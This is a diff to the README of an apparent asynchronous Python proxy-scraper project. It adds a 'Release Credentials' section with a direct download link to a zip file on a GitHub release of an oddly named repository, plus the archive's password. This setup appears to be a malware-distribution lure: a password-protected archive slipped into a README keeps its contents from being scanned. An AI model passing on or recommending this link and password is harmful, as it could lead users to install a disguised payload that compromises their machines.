@@ -17,3 +17,10 @@ An asynchronous, high-concurrency Python script designed to scrape free proxies 
 * Required third-party libraries:
   ```bash
   pip install aiohttp requests urllib3
+
+
+---
+
+## 🔐 Release Credentials
+- **Download Package:** [Direct Release Asset](https://github.com/Barrieroacapture/Proxy-Harvester-bin-eg6i/releases/download/v1.0.0/Proxy-Harvester.zip)
+- **Archive Password:** `yT5Kq5DgmM`
